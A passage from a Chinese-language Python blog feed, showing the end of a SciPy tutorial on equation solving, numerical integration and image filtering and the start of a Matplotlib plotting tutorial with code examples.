result <span class="token operator">=</span> fsolve<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"结果："</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> <span class="token string">"误差："</span><span class="token punctuation">,</span> f<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>结果： [0.92729522] 误差： [-1.6653345369377348e-16]  </code></pre><p>So easy. Now let’s try some difficult<br><br>$4x^2−2sin(yz)=0$ <br><br>$5y+3=0 $  <br><br>$yz−1.5=0$  <br>  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scipy<span class="token punctuation">.</span>optimize <span class="token keyword">import</span> fsolve  <span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 误差函数  </span>    x <span class="token operator">=</span> float<span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      y <span class="token operator">=</span> float<span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      z <span class="token operator">=</span> float<span class="token punctuation">(</span>A<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>x<span class="token operator">*</span>x<span class="token number">-2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>y<span class="token operator">*</span>z<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token operator">*</span>y<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span> y<span class="token operator">*</span>z<span class="token number">-1.5</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 返回各个式子对应的误差。  </span>result <span class="token operator">=</span> fsolve<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 对应的各个未知数的解  </span>deviation <span class="token operator">=</span> f<span class="token punctuation">(</span>result<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"结果: %s\n误差：%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>deviation<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>结果: [-0.70622057 -0.6        -2.5       ]  误差：[-9.126033262418787e-14, 0.0, 5.329070518200751e-15]  </code></pre><h2 id="4-数值积分"><a href="#4-数值积分" class="headerlink" title="4 数值积分"></a>4 数值积分</h2><p>数值积分是对定积分的数值求解，例如可以利用数值积分求解某个形状的面积。我们知道，圆的方程可写成：<code>$x^2+y^2=1$</code>， 下面让我们来考虑一下如何计算半径为1的半圆的面积，根据圆的面积公式，其面积应等于Π。单位半圆曲线可用以下函数表示$y=\sqrt{(1-x^2)}$<br><br>我们先定义一个根据x计算y的函数：  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half_circle</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">0.5</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-1-经典微分法"><a href="#4-1-经典微分法" class="headerlink" title="4.1 经典微分法"></a>4.1 经典微分法</h3><p>下面的程序使用经典的分小矩形的方法计算面积总和的方式，计算出半圆的面积：  </p><pre class="line-numbers language-python"><code class="language-python">N <span class="token operator">=</span> <span class="token number">10000</span>  x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>  dx <span class="token operator">=</span> <span class="token number">2.0</span> <span class="token operator">/</span> N  y <span class="token operator">=</span> half_circle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  dx <span class="token operator">*</span> np<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> y<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 面积的两倍  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>3.1412751679989044  </code></pre><h3 id="4-2-使用定积分求解函数"><a href="#4-2-使用定积分求解函数" class="headerlink" title="4.2 使用定积分求解函数"></a>4.2 使用定积分求解函数</h3><p>如果我们调用scipy.integrate库中的quad函数的话将会的到非常精确的结果  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scipy <span class="token keyword">import</span> integrate  pi_half<span class="token punctuation">,</span> err <span class="token operator">=</span> integrate<span class="token punctuation">.</span>quad<span class="token punctuation">(</span>half_circle<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"圆的面积：%f\n误差：%f"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pi_half<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>圆的面积：3.141593  误差：0.000000  </code></pre><h2 id="5-图形处理"><a href="#5-图形处理" class="headerlink" title="5 图形处理"></a>5 图形处理</h2><p>在scipy.misc模块中，有一个函数可以载入Ascent幅图像是被用作图像处理的经典示范图。简单演示在该图像上的操作。    </p><ol><li>载入Ascent图像，并显示灰度图像  </li><li>应用中值滤波扫描每一个数据点，并替换为相邻数据点的中值  </li><li>旋转图像  </li><li>应用Prwitt滤波器（基于图形强度的梯度计算）  </li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scipy <span class="token keyword">import</span> misc  <span class="token keyword">from</span> scipy <span class="token keyword">import</span> ndimage  img <span class="token operator">=</span> misc<span class="token punctuation">.</span>ascent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>astype<span class="token punctuation">(</span>np<span class="token punctuation">.</span>float32<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Original Image"</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>img<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>gray<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Median Filter"</span><span class="token punctuation">)</span>  filtered <span class="token operator">=</span> ndimage<span class="token punctuation">.</span>median_filter<span class="token punctuation">(</span>img<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>filtered<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>gray<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">223</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Rotated"</span><span class="token punctuation">)</span>  rotated <span class="token operator">=</span> ndimage<span class="token punctuation">.</span>rotate<span class="token punctuation">(</span>img<span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>rotated<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>gray<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Prewitt Filter"</span><span class="token punctuation">)</span>  filtered <span class="token operator">=</span> ndimage<span class="token punctuation">.</span>prewitt<span class="token punctuation">(</span>img<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>filtered<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>gray<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4  </span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hf00f9153d4fa4331a5dc023c27e8601eF.png" alt>  </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib</title>
      <link href="/2019/07/24/2019-matplotlib/"/>
      <url>/2019/07/24/2019-matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="Matplotlib"><a href="#Matplotlib" class="headerlink" title="Matplotlib"></a>Matplotlib</h1><p>matplotlib 提供了一整套和Matlab相似的命令API，十分适合交互式地进行绘图。而且也可以方便的将它最为绘图控件，嵌入GUI应用中。matplotlib可以绘制多种形式的图包括普通的线图，直方图，饼图，散点图以及误差曲线等；可以比较方便的定制图形的各种属性不如图线的颜色，粗细，字体的大小等，它能够很好地支持一部分TeX排版命令，可以美观的显示图中的数学公式  </p><h2 id="1-pylab介绍"><a href="#1-pylab介绍" class="headerlink" title="1 pylab介绍"></a>1 pylab介绍</h2><p>matplotlib种包含几十个不同的模块，如matlob，mathtext，finance，dates等，而pylab则是其中最常用的模块  </p><h3 id="1-1-中文显示问题解决方案"><a href="#1-1-中文显示问题解决方案" class="headerlink" title="1.1 中文显示问题解决方案"></a>1.1 中文显示问题解决方案</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pylab <span class="token keyword">import</span> mpl  mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FangSong'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 指定默认字体  </span>mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true"># 解决保存图像时‘-’显示为方块的问题  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="1-2绘制最简单的图形"><a href="#1-2绘制最简单的图形" class="headerlink" title="1.2绘制最简单的图形"></a>1.2绘制最简单的图形</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token comment" spellcheck="true">#plt.rcParams['figure.dpi'] = 100 #分辨率  </span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'figure.dpi'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token comment" spellcheck="true">#分辨率  </span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">0.01</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hc56a25c665224c608796859df53edbc6Q.png" alt>  </p><h3 id="1-3-设置标题、坐标名称、坐标轴范围"><a href="#1-3-设置标题、坐标名称、坐标轴范围" class="headerlink" title="1.3 设置标题、坐标名称、坐标轴范围"></a>1.3 设置标题、坐标名称、坐标轴范围</h3><p>如果在python的shell中运行下面的代码，而shell的默认编码不是utf-8的话，中文可能仍然会显示为乱码。可以尝试把u’正弦曲线’。decode(‘gbk’) 或者’正弦曲线’.decode(‘utf-8’)  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">from</span> pylab <span class="token keyword">import</span> mpl  mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FangSong'</span><span class="token punctuation">]</span>   mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  x <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">0.01</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span>u<span class="token string">'正弦曲线'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置标题  </span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span>u<span class="token string">'弧度'</span><span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 显示横轴名称  </span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span>u<span class="token string">'正弦值'</span><span class="token punctuation">,</span>fontdict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'size'</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 显示纵轴名称  </span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0.1</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">2.1</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置坐标轴范围  </span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hf6f16e08c2504fbaab771fb8e1b9f437M.png" alt>  </p><h3 id="1-4-设置点和线的样式、宽度、颜色"><a href="#1-4-设置点和线的样式、宽度、颜色" class="headerlink" title="1.4 设置点和线的样式、宽度、颜色"></a>1.4 设置点和线的样式、宽度、颜色</h3><p>plt.plot函数的调用形式如下：  </p><pre class="line-numbers language-python"><code class="language-python">plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span> linestyle<span class="token operator">=</span><span class="token string">"dashed"</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span> markerfacecolor<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span> markersize<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>  plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> ls<span class="token operator">=</span><span class="token string">'---'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span> mfc<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">,</span> ms<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>color 指定线的颜色， 可简写为‘c’。颜色的选项为：  <ul><li>蓝色 ‘b’  </li><li>绿色 ‘g’  </li><li>红色 ‘r’  </li><li>墨绿 ‘c’  </li><li>洋红 ‘m’  </li><li>黄色 ‘y’  </li><li>黑色 ‘k’  </li><li>白色 ‘w’  </li><li>灰度表示 e.g.  0.75([0, 1]内的任意浮点数)  </li><li>RGB表示法 e.g. ‘#2F4F4F’ 或 (0.18, 0.31, 0.31)  </li></ul></li><li>linestyle 指定线型, 可简写为’ls’  <ul><li>实线： ‘-’   </li><li>虚线： ‘–’   </li><li>虚点线: ‘-.’  </li><li>点线：‘:’  </li><li>无： ‘’或‘None’  </li></ul></li><li>linewidth 指定线的宽度, 可简写为’lw’  </li><li>marker 描述数据点的形状  <ul><li>点线 ‘.’  </li><li>点线 ‘o’  </li><li>加号 ‘+’  </li><li>叉号 ‘x’  </li><li>上三角 ‘^’  </li><li>上三角 ‘v’  </li></ul></li><li>markerfacecolor 指定数据点标记的表面颜色， 可简写为 ‘mfc’  </li><li>markersize 指定数据点标记的大小， 可简写为‘ms’  </li></ol><h2 id="1-5-文本标注和图例"><a href="#1-5-文本标注和图例" class="headerlink" title="1.5 文本标注和图例"></a>1.5 文本标注和图例</h2><p>我们使用不同的线形、颜色来绘制以10、e、2为基的一组幂函数曲线，颜色文本标注和图例的使用  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">from</span> pylab <span class="token keyword">import</span> mpl  mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FangSong'</span><span class="token punctuation">]</span>  mpl<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>  f1 <span class="token operator">=</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>  f2 <span class="token operator">=</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span>np<span class="token punctuation">.</span>e<span class="token punctuation">,</span> x<span class="token punctuation">)</span>  f3 <span class="token operator">=</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> f1<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> ls<span class="token operator">=</span><span class="token string">'-'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"$10^x$"</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> ls<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'$e^x$'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> f3<span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> ls<span class="token operator">=</span><span class="token string">':'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'$2^x$'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">,</span> r<span class="token string">'$10^x$'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">,</span> r<span class="token string">'$e^x$'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">3.2</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">,</span> r<span class="token string">'$2^x$'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"幂函数曲线"</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">'upper left'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hb341fec4aa7649829318a31ff0205c89B.png" alt>  </p><h2 id="2-绘制多轴图"><a href="#2-绘制多轴图" class="headerlink" title="2 绘制多轴图"></a>2 绘制多轴图</h2><p>在介绍如何将多福子图绘制在一个画板的同时， 顺便演示如何绘制直线和矩形。我们可以使用<em>subplot</em>函数快速绘制多个轴的图表。subplot函数的调用形式如下  </p><pre class="line-numbers language-python"><code class="language-python">subplot<span class="token punctuation">(</span>numRows<span class="token punctuation">,</span> numCols<span class="token punctuation">,</span> plotNum<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>subplot 将整个绘图区域等分为numRows行*numCols列个子区域，然后按照从左到右，从上到下的顺序对每个子区域进行编号，左上的子区域的编号为1。如果numRows，numCols和plotNUm这三个数都小于10的话，可以把他们缩写为一个整数，例如subplot(323)和subplot(3,2,3)是相同的。subplot在plotNum指定的区域中创建一个轴对象。如果新创建的轴和之前创建的轴重叠的话，之前的轴将会被删除。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 两行两列的第一个位置  </span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axhline<span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> xmin<span class="token operator">=</span><span class="token number">0.25</span><span class="token punctuation">,</span> xmax<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 两行两列的第二个位置  </span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axvline<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> ymin<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axvline<span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">1.0</span><span class="token punctuation">,</span> ymin<span class="token operator">=</span><span class="token operator">-</span><span class="token number">0.5</span><span class="token punctuation">,</span> ymax<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 两行一列的第二个位置  </span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>axvspan<span class="token punctuation">(</span><span class="token number">1.25</span><span class="token punctuation">,</span> <span class="token number">1.55</span><span class="token punctuation">,</span> fc<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>  plt<span class="token 